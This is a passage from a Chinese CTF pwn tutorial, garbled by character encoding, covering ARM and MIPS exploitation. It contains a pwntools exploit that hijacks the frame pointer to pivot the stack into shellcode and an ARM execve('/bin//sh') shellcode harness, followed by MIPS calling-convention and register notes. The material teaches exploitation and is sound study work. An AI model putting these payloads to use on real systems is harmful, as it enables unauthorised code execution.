class="built_in">puts</span>(<span class="string">&quot;Welcome to my world!I am PIG-007!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input your name:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,bss,<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello! &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(bss);</span><br><span class="line">    myFunc(bss,<span class="built_in">strlen</span>(bss),i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-åˆ©ç”¨ï¼š-1"   >
          <a href="#3-åˆ©ç”¨ï¼š-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åˆ©ç”¨ï¼š-1" class="headerlink" title="(3)åˆ©ç”¨ï¼š"></a>(3)åˆ©ç”¨ï¼š</h3>
      <p>ç›´æ¥åŠ«æŒLast FPï¼Œç„¶ååˆ©ç”¨ä¸Šä¸€å±‚å‡½æ•°è¿”å›æ—¶åŠ«æŒæ ˆï¼Œåœ¨æ ˆä¸Šä¿å­˜shellcodeåœ°å€ï¼Œç›´æ¥è¿›å…¥shellcodeå³å¯getshellã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">shellcode_addr =  bss_addr + <span class="number">0x20</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;A&quot;</span>*<span class="number">0x14</span></span><br><span class="line">payload += p32(bss_addr + <span class="number">0x18</span>)</span><br><span class="line">payload += p32(bss_addr + <span class="number">0x18</span>)</span><br><span class="line">payload += p32(shellcode_addr)</span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment">#mulArchDbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p>pop {fp}ä¹‹åå·²ç»åŠ«æŒæ ˆåˆ°bssæ®µä¸Šäº†</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106220032.png" alt="image-20211106220025308"></p>
<p>è¿”å›mainå‡½æ•°ä¹‹åï¼Œåˆ©ç”¨mainå‡½æ•°ä¸­çš„è¿”å›æŒ‡ä»¤<code>sub sp,fp,#4</code>å®Œæˆæ ˆåŠ«æŒ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106220242.png" alt="image-20211106220242850"></p>
<p>ç„¶åå°±åˆ©ç”¨<code>pop &#123;fp, pc&#125;</code>æ¥åŠ«æŒè¿”å›åœ°å€ï¼Œè¿›å…¥åˆ°æˆ‘ä»¬è¾“å…¥çš„bssæ®µä¸Šshellcodeçš„åœ°æ–¹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106221534.png" alt="image-20211106221534722"></p>

        <h4 id="æ³¨ï¼š"   >
          <a href="#æ³¨ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ³¨ï¼š" class="headerlink" title="æ³¨ï¼š"></a>æ³¨ï¼š</h4>
      <p>ä¸åœ¨bssæ®µä¸Šæ—¶ï¼Œæˆ‘ä»¬åŠ«æŒå®ŒLast FPï¼Œè¿”å›ä¸Šä¸€å±‚å‡½æ•°æ ˆä¸­æ—¶ï¼Œå½“æº¢å‡ºé•¿åº¦è¶³å¤Ÿï¼Œå¯ç›´æ¥ä¿®æ”¹ä¸Šä¸€å±‚å‡½æ•°æ ˆä¸­çš„æ•°æ®ï¼Œç›¸å½“äºå°±æ˜¯éå¶å­å‡½æ•°çš„æº¢å‡ºäº†ã€‚</p>
<p>è‡³äºæº¢å‡ºé•¿åº¦ä¸å¤Ÿï¼Œåªèƒ½åŠ«æŒLast FPçš„æ—¶å€™ï¼Œåˆæ— æ³•æ³„éœ²åœ°å€ï¼Œæ„Ÿè§‰ä¸å¤ªèƒ½æï¼Œæˆ–è€…ä¸Šä¸Šä¸€å±‚å‡½æ•°ä¸­æœ‰å‰©ä¸‹å¯åˆ©ç”¨çš„æ•°æ®ï¼Œé‚£ä¹ˆå°±éƒ¨åˆ†åŠ«æŒLast FPï¼Œåˆ©ç”¨ä¸Šä¸Šä¸€å±‚å‡½æ•°ä¸­å‰©ä¸‹çš„æ±‡ç¼–æ¥getshellï¼Œè¿™ä¸ªå…·ä½“çœ‹é¢˜ç›®ã€‚</p>

        <h2 id="4-æ ¼å¼åŒ–å­—ç¬¦ä¸²"   >
          <a href="#4-æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="4.æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>4.æ ¼å¼åŒ–å­—ç¬¦ä¸²</h2>
      <p>armæ¶æ„ä¸‹çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²çš„é¡ºåºæ˜¯R1,R2,R3,æ ˆï¼Œå…¶ä»–çš„ç›¸å…³åˆ©ç”¨æ–¹å¼ä¹Ÿæ˜¯ç±»ä¼¼ï¼Œä¸å†å¤šè¯´ã€‚</p>

        <h2 id="5-å †"   >
          <a href="#5-å †" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-å †" class="headerlink" title="5.å †"></a>5.å †</h2>
      <p>å †çš„åˆ©ç”¨æ–¹æ³•ä¹Ÿæ˜¯ç±»ä¼¼çš„ã€‚</p>
<p>å‚è€ƒï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/199112#h3-20" >ARMæ¶æ„ä¸‹çš„ Pwn çš„ä¸€èˆ¬è§£å†³æ€è·¯ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="Shellcode"   >
          <a href="#Shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *SC =      <span class="string">&quot;\x01\x30\x8f\xe2&quot;</span></span><br><span class="line">                <span class="string">&quot;\x13\xff\x2f\xe1&quot;</span></span><br><span class="line">                <span class="string">&quot;\x78\x46\x0e\x30&quot;</span></span><br><span class="line">                <span class="string">&quot;\x01\x90\x49\x1a&quot;</span></span><br><span class="line">                <span class="string">&quot;\x92\x1a\x08\x27&quot;</span></span><br><span class="line">                <span class="string">&quot;\xc2\x51\x03\x37&quot;</span></span><br><span class="line">                <span class="string">&quot;\x01\xdf\x2f\x62&quot;</span></span><br><span class="line">                <span class="string">&quot;\x69\x6e\x2f\x2f&quot;</span></span><br><span class="line">                <span class="string">&quot;\x73\x68&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> payload[<span class="number">34</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(payload, SC, <span class="number">34</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;Length: %d\n&quot;</span>, <span class="built_in">strlen</span>(SC));</span><br><span class="line">    (*(<span class="keyword">void</span>(*)()) payload) ();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h1 id="ä¸‰ã€MIPS"   >
          <a href="#ä¸‰ã€MIPS" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‰ã€MIPS" class="headerlink" title="ä¸‰ã€MIPS"></a>ä¸‰ã€MIPS</h1>
      <p>ä¸»è¦ä»‹ç»mipselæ¶æ„çš„ï¼Œå°ç«¯åºï¼Œå¤§ç«¯çš„mipså¾ˆå°‘è€ƒåˆ°ï¼Œè€Œä¸”ä¹ŸåŸºæœ¬éƒ½æ˜¯å¤§åŒå°å¼‚</p>

        <h2 id="1-æµæ°´çº¿ç‰¹ç‚¹"   >
          <a href="#1-æµæ°´çº¿ç‰¹ç‚¹" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æµæ°´çº¿ç‰¹ç‚¹" class="headerlink" title="1.æµæ°´çº¿ç‰¹ç‚¹"></a>1.æµæ°´çº¿ç‰¹ç‚¹</h2>
      <p>ä»¥ä¸‹æŒ‡ä»¤çš„ï¼Œstrchr å‡½æ•°çš„å‚æ•°æ¥è‡ª $s0 è€Œä¸æ˜¯ $s2</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $a0, $s2;</span><br><span class="line">jalr strchr;</span><br><span class="line">move $a0, $s0;</span><br></pre></td></tr></table></div></figure>


        <h2 id="ğŸ”ºæ³¨ï¼šæµæ°´çº¿"   >
          <a href="#ğŸ”ºæ³¨ï¼šæµæ°´çº¿" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼šæµæ°´çº¿" class="headerlink" title="ğŸ”ºæ³¨ï¼šæµæ°´çº¿"></a>ğŸ”ºæ³¨ï¼šæµæ°´çº¿</h2>
      <p>å³è·³è½¬ä¹‹å‰ä¼šå…ˆä¸€æ­¥åŠ è½½ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œæ‰€ä»¥åœ¨å¯»æ‰¾ROPæ—¶ï¼Œæ³¨æ„çœ‹ä¸‹ä¸€æ­¥æŒ‡ä»¤éƒ½æ˜¯ä»€ä¹ˆï¼Œä¸ç„¶è·³è½¬è¿‡å»å‚æ•°æˆ–è€…æ ˆå¸§éƒ½æœ‰å¯èƒ½ä¼šå‡ºé”™çš„ã€‚</p>
<p>ä½†æ˜¯å› ä¸ºé€šå¸¸PWNé¢˜çš„MIPSé€šå¸¸æ˜¯ç”¨qemuçš„useræ¨¡å¼è¿è¡Œçš„ï¼Œè¿™ä¸ªå¯èƒ½å¯¼è‡´æŒ‡ä»¤æµæ°´æœ‰æ—¶å€™è¡¨ç°ä¸å‡ºæ¥ï¼Œæ‰€ä»¥ä¸æ²¡æœ‰è°ƒç”¨å‡½æ•°sleep(1)å»å°†æ•°æ®åŒºåˆ·æ–°åˆ°æŒ‡ä»¤åŒºåŸŸä¹Ÿæ˜¯å¯ä»¥æ‹¿åˆ°shellçš„ï¼›ä½†æ˜¯å¦‚æœé¢˜ç›®ä½¿ç”¨systemæ¨¡å¼éƒ¨ç½²ï¼Œæ·»åŠ è°ƒç”¨å‡½æ•°åˆ·æ–°æ•°æ®åŒºåŸŸå†è·³è½¬åˆ°shellcodeå°±å¾ˆå¿…è¦äº†ï¼Œä½†å¦‚æœæ˜¯ROPæ¥getshellå€’æ˜¯ä¸ç”¨åˆ·æ–°æ•°æ®ã€‚</p>

        <h2 id="2-æ ˆæœºåˆ¶"   >
          <a href="#2-æ ˆæœºåˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ ˆæœºåˆ¶" class="headerlink" title="2.æ ˆæœºåˆ¶"></a>2.æ ˆæœºåˆ¶</h2>
      
        <h3 id="å‡½æ•°è°ƒç”¨"   >
          <a href="#å‡½æ•°è°ƒç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‡½æ•°è°ƒç”¨" class="headerlink" title="å‡½æ•°è°ƒç”¨"></a>å‡½æ•°è°ƒç”¨</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00409A14                 la      $t9, sobj_del</span><br><span class="line">.text:00409A18                 nop</span><br><span class="line">.text:00409A1C                 jalr    $t9 ; sobj_del</span><br><span class="line">.text:00409A20                 move    $a0, $s5</span><br><span class="line">.text:00409A24                 lw      $gp, 0x4C0+var_4B0($sp)</span><br></pre></td></tr></table></div></figure>

<p>å¸¸è§äºåº“å‡½æ•°</p>
<ul>
<li><p>é€šè¿‡<code>$t9</code>æ¥è·³è½¬</p>
</li>
<li><p>è·³è½¬æŒ‡ä»¤ä¸º<code>jalr</code>ï¼Œä¿å­˜è¿”å›åœ°å€åˆ°<code>$ra</code>ï¼Œè¿™é‡Œçš„è¿”å›åœ°å€å³ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00409A24                 lw      $gp, 0x4C0+var_4B0($sp)</span><br></pre></td></tr></table></div></figure></li>
<li><p>ç”±äºäº”çº§æµæ°´çº¿ï¼Œæ‰€ä»¥é€šå¸¸åœ¨è·³è½¬æŒ‡ä»¤ä¸‹ä¸€æ¡æŒ‡ä»¤åŠ è½½å‚æ•°ï¼Œè¿™é‡Œå³ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00409A20                 move    $a0, $s5</span><br></pre></td></tr></table></div></figure>

<p>å½“ç„¶å¦‚æœæ¶‰åŠåˆ°å¤šä¸ªå‚æ•°å°±ä¼šæå‰åŠ è½½äº†</p>
</li>
</ul>

        <h3 id="å‡½æ•°æ ˆåŠ è½½"   >
          <a href="#å‡½æ•°æ ˆåŠ è½½" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‡½æ•°æ ˆåŠ è½½" class="headerlink" title="å‡½æ•°æ ˆåŠ è½½"></a>å‡½æ•°æ ˆåŠ è½½</h3>
      
        <h4 id="å¶å­å‡½æ•°"   >
          <a href="#å¶å­å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#å¶å­å‡½æ•°" class="headerlink" title="å¶å­å‡½æ•°"></a>å¶å­å‡½æ•°</h4>
      <p>å¶å­å‡½æ•°ä¸éœ€è¦å°†è¿”å›åœ°å€ä¿å­˜åˆ°æ ˆä¸Šï¼Œæ‰€ä»¥ä¸€èˆ¬åªéœ€è¦å°†å‚æ•°æ”¾å…¥æ ˆä¸­</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//æ ˆç©ºé—´å¼€è¾Ÿ</span><br><span class="line">.text:00400834                 addiu   $sp, -0x30</span><br><span class="line">//æ ˆæŒ‡é’ˆè®¾ç½®</span><br><span class="line">.text:00400838                 sw      $fp, 0x2C+var_s0($sp)</span><br><span class="line">.text:0040083C                 move    $fp, $sp</span><br><span class="line">//å‚æ•°å…¥æ ˆ</span><br><span class="line">.text:00400840                 sw      $a0, 0x2C+test($fp)</span><br></pre></td></tr></table></div></figure>

<p>æœ‰çš„ä¹Ÿä¼šæœ‰å…³äº<code>$gp</code>æŒ‡é’ˆçš„è®¾ç½®ï¼Œä¸€èˆ¬æ˜¯ç”¨åˆ°äº†å…¨å±€å˜é‡ï¼Œå¸¸é‡ä»€ä¹ˆçš„</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00409480                 lui     $gp, 0x43  # &#x27;C&#x27;</span><br><span class="line">.text:00409484                 addiu   $sp, -0x4E8</span><br><span class="line">.text:00409488                 li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)</span><br></pre></td></tr></table></div></figure>


        <h4 id="éå¶å­å‡½æ•°"   >
          <a href="#éå¶å­å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#éå¶å­å‡½æ•°" class="headerlink" title="éå¶å­å‡½æ•°"></a>éå¶å­å‡½æ•°</h4>
      <p>éå¶å­å‡½æ•°éœ€è¦å°†è¿”å›åœ°å€ä¿å­˜åˆ°æ ˆä¸Š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00409480                 lui     $gp, 0x43  # &#x27;C&#x27;</span><br><span class="line">//æ ˆç©ºé—´å¼€è¾Ÿ</span><br><span class="line">.text:00409484                 addiu   $sp, -0x4E8</span><br><span class="line">.text:00409488                 li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)</span><br><span class="line">.text:0040948C                 sw      $ra, 0x4C0+var_s24($sp)</span><br><span class="line">.text:00409490                 sw      $fp, 0x4C0+var_s20($sp)</span><br><span class="line">//è¿”å›åœ°å€$raå…¥æ ˆ</span><br></pre></td></tr></table></div></figure>


        <h3 id="å‡½æ•°è¿”å›"   >
          <a href="#å‡½æ•°è¿”å›" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‡½æ•°è¿”å›" class="headerlink" title="å‡½æ•°è¿”å›"></a>å‡½æ•°è¿”å›</h3>
      
        <h4 id="å¶å­å‡½æ•°-1"   >
          <a href="#å¶å­å‡½æ•°-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#å¶å­å‡½æ•°-1" class="headerlink" title="å¶å­å‡½æ•°"></a>å¶å­å‡½æ•°</h4>
      <p>å¶å­å‡½æ•°ç›´æ¥é€šè¿‡<code>$ra</code>å¯„å­˜å™¨è¿”å›</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//....ä¸€äº›å‚æ•°åŠ è½½</span><br><span class="line">.text:00409A54                 jr      $ra</span><br><span class="line">//æ ˆç©ºé—´é”€æ¯</span><br><span class="line">.text:00409A58                 addiu   $sp, 0x4E8</span><br></pre></td></tr></table></div></figure>


        <h4 id="éå¶å­å‡½æ•°-1"   >
          <a href="#éå¶å­å‡½æ•°-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#éå¶å­å‡½æ•°-1" class="headerlink" title="éå¶å­å‡½æ•°"></a>éå¶å­å‡½æ•°</h4>
      <p>éå¶å­å‡½æ•°éœ€è¦ä»æ ˆä¸­è·å–è¿”å›åœ°å€åˆ°<code>$ra</code>å¯„å­˜å™¨ï¼Œç„¶åä¹Ÿæ˜¯é€šè¿‡<code>$ra</code>å¯„å­˜å™¨è¿”å›</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//ä¸€äº›å¤„ç†å·¥ä½œ....</span><br><span class="line">.text:0040091C                 move    $sp, $fp</span><br><span class="line">//è·å–æ ˆä¸Šçš„è¿”å›åœ°å€</span><br><span class="line">.text:00400920                 lw      $ra, 0x28+var_s4($sp)</span><br><span class="line">.text:00400924                 lw      $fp, 0x28+var_s0($sp)</span><br><span class="line">//é€šè¿‡$raè¿”å›</span><br><span class="line">.text:00400928                 jr      $ra</span><br><span class="line">//æ ˆç©ºé—´é”€æ¯</span><br><span class="line">.text:0040092C                 addiu   $sp, 0x30</span><br></pre></td></tr></table></div></figure>


        <h3 id="æ€»ç»“ï¼š"   >
          <a href="#æ€»ç»“ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h3>
      <p>æ€»çš„æ¥è¯´ï¼Œå’Œx86ä¹Ÿæ˜¯æœ‰ç‚¹ç›¸ä¼¼ï¼Œä¸åŒçš„å°±æ˜¯å…³äº<code>$ra</code>å¯„å­˜å™¨çš„ä½¿ç”¨ï¼Œä»¥åŠå¶å­å‡½æ•°å’Œéå¶å­å‡½æ•°çš„åŒºåˆ«ï¼Œè¿˜æœ‰ä¸€äº›äº”çº§æµæ°´çº¿æœºåˆ¶ã€‚</p>

        <h2 id="3-å¯„å­˜å™¨å…³ç³»"   >
          <a href="#3-å¯„å­˜å™¨å…³ç³»" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å¯„å­˜å™¨å…³ç³»" class="headerlink" title="3.å¯„å­˜å™¨å…³ç³»"></a>3.å¯„å­˜å™¨å…³ç³»</h2>
      <div class="table-container"><table>
<thead>
<tr>
<th align="left">REGISTER</th>
<th align="left">NAME</th>
<th align="left">USAGE</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$0</td>
<td align="left">$zero</td>
<td align="left">å¸¸é‡0(constant value 0)</td>
</tr>
<tr>
<td align="left">$1</td>
<td align="left">$at</td>
<td align="left">ä¿ç•™ç»™æ±‡ç¼–å™¨(Reserved for assembler)</td>
</tr>
<tr>
<td align="left">$2-$3</td>
<td align="left">$v0 - $v1</td>
<td align="left">å‡½æ•°è°ƒç”¨è¿”å›å€¼(values for results and expression evaluation)</td>
</tr>
<tr>
<td align="left">$4-$7</td>
<td align="left">$a0-$a3</td>
<td align="left">å‡½æ•°è°ƒç”¨å‚æ•°(arguments)</td>
</tr>
<tr>
<td align="left">$8-$15</td>
<td align="left">$t0-$t7</td>
<td align="left">æš‚æ—¶çš„(æˆ–éšä¾¿ç”¨çš„)</td>
</tr>
<tr>
<td align="left">$16-$23</td>
<td align="left">$s0-$s7</td>
<td align="left">ä¿å­˜çš„(æˆ–å¦‚æœç”¨ï¼Œéœ€è¦SAVE/RESTOREçš„)(saved)</td>
</tr>
<tr>
<td align="left">$24-$25</td>
<td align="left">$t8-$t9</td>
<td align="left">æš‚æ—¶çš„(æˆ–éšä¾¿ç”¨çš„),$t9é€šå¸¸ä¼šåœ¨å‡½æ•°è°ƒç”¨æ—¶ç”¨åˆ°</td>
</tr>
<tr>
<td align="left">$28</td>
<td align="left">$gp</td>
<td align="left">å…¨å±€æŒ‡é’ˆ(Global Pointer),é€šå¸¸æœ‰å…¨å±€å˜é‡ã€å¸¸é‡ä¹‹ç±»ä¼šç”¨åˆ°</td>
</tr>
<tr>
<td align="left">$29</td>
<td align="left">$sp</td>
<td align="left">å †æ ˆæŒ‡é’ˆ(Stack Pointer)</td>
</tr>
<tr>
<td align="left">$30</td>
<td align="left">$fp</td>
<td align="left">å¸§æŒ‡é’ˆ(Frame Pointer)</td>
</tr>
</tbody></table></div>
<p>è¯´æ˜</p>
<ul>
<li>$0</li>
</ul>
<p>å³$zero,è¯¥å¯„å­˜å™¨æ€»æ˜¯è¿”å›é›¶ï¼Œä¸º0è¿™ä¸ªæœ‰ç”¨å¸¸æ•°æä¾›äº†ä¸€ä¸ªç®€æ´çš„ç¼–ç å½¢å¼ã€‚</p>
<figure class="highlight mipsasm"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">move </span>$<span class="built_in">t0</span>,$<span class="built_in">t1</span></span><br><span class="line"><span class="comment">#å®é™…ä¸º  </span></span><br><span class="line"><span class="keyword">add </span>$<span class="built_in">t0</span>,$<span class="number">0</span>,$<span class="built_in">t1</span></span><br></pre></td></tr></table></div></figure>

<p>ä½¿ç”¨ä¼ªæŒ‡ä»¤å¯ä»¥ç®€åŒ–ä»»åŠ¡ï¼Œæ±‡ç¼–ç¨‹åºæä¾›äº†æ¯”ç¡¬ä»¶æ›´ä¸°å¯Œçš„æŒ‡ä»¤é›†ã€‚</p>
<ul>
<li>$1</li>
</ul>
<p>å³ $atï¼Œè¯¥å¯„å­˜å™¨ä¸ºæ±‡ç¼–ä¿ç•™ï¼Œç”±äºIå‹æŒ‡ä»¤çš„ç«‹å³æ•°å­—æ®µåªæœ‰16ä½ï¼Œåœ¨åŠ è½½å¤§å¸¸æ•°æ—¶ï¼Œç¼–è¯‘å™¨æˆ–æ±‡ç¼–ç¨‹åºéœ€è¦æŠŠå¤§å¸¸æ•°æ‹†å¼€ï¼Œç„¶åé‡æ–°ç»„åˆåˆ°å¯„å­˜å™¨é‡Œã€‚æ¯”å¦‚åŠ è½½ä¸€ä¸ª32ä½ç«‹å³æ•°éœ€è¦ <code>lui</code>ï¼ˆè£…å…¥é«˜ä½ç«‹å³æ•°ï¼‰å’Œ<code>addi</code>ä¸¤æ¡æŒ‡ä»¤ã€‚åƒMIPSç¨‹åºæ‹†æ•£å’Œé‡è£…å¤§å¸¸æ•°ç”±æ±‡ç¼–ç¨‹åºæ¥å®Œæˆï¼Œæ±‡ç¼–ç¨‹åºå¿…éœ€ä¸€ä¸ªä¸´æ—¶å¯„å­˜å™¨æ¥é‡ç»„å¤§å¸¸æ•°ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºæ±‡ç¼–ä¿ç•™$atçš„åŸå› ä¹‹ä¸€ã€‚</p>
<ul>
<li>$2..$3:($v0-$v1)</li>
</ul>
<p>ç”¨äºå­ç¨‹åºçš„éæµ®ç‚¹ç»“æœæˆ–è¿”å›å€¼ï¼Œå¯¹äºå­ç¨‹åºå¦‚ä½•ä¼ é€’å‚æ•°åŠå¦‚ä½•è¿”å›ï¼ŒMIPSèŒƒå›´æœ‰ä¸€å¥—çº¦å®šï¼Œå †æ ˆä¸­å°‘æ•°å‡ ä¸ªä½ç½®å¤„çš„å†…å®¹è£…å…¥CPUå¯„å­˜å™¨ï¼Œå…¶ç›¸åº”å†…å­˜ä½ç½®ä¿ç•™æœªåšå®šä¹‰ï¼Œå½“è¿™ä¸¤ä¸ªå¯„å­˜å™¨ä¸å¤Ÿå­˜æ”¾è¿”å›å€¼æ—¶ï¼Œç¼–è¯‘å™¨é€šè¿‡å†…å­˜æ¥å®Œæˆã€‚</p>
<ul>
<li>$4..$7:($a0-$a3)</li>
</ul>
<p>ç”¨æ¥ä¼ é€’å‰å››ä¸ªå‚æ•°ç»™å­ç¨‹åºï¼Œä¸å¤Ÿçš„ç”¨å †æ ˆã€‚a0-a3å’Œv0-v1ä»¥åŠraä¸€èµ·æ¥æ”¯æŒå­ç¨‹åºï¼è¿‡ç¨‹è°ƒç”¨ï¼Œåˆ†åˆ«ç”¨ä»¥ä¼ é€’å‚æ•°ï¼Œè¿”å›ç»“æœå’Œå­˜æ”¾è¿”å›åœ°å€ã€‚å½“éœ€è¦ä½¿ç”¨æ›´å¤šçš„å¯„å­˜å™¨æ—¶ï¼Œå°±éœ€è¦å †æ ˆï¼ˆstack)äº†,MIPSç¼–è¯‘å™¨æ€»æ˜¯ä¸ºå‚æ•°åœ¨å †æ ˆä¸­ç•™æœ‰ç©ºé—´ä»¥é˜²æœ‰å‚æ•°éœ€è¦å­˜å‚¨ã€‚</p>
<ul>
<li>$8..$15:($t0-$t7)</li>
</ul>
<p>ä¸´æ—¶å¯„å­˜å™¨ï¼Œå­ç¨‹åºå¯ä»¥ä½¿ç”¨å®ƒä»¬è€Œä¸ç”¨ä¿ç•™ã€‚</p>
<ul>
<li>$16..$23:($s0-$s7)</li>
</ul>
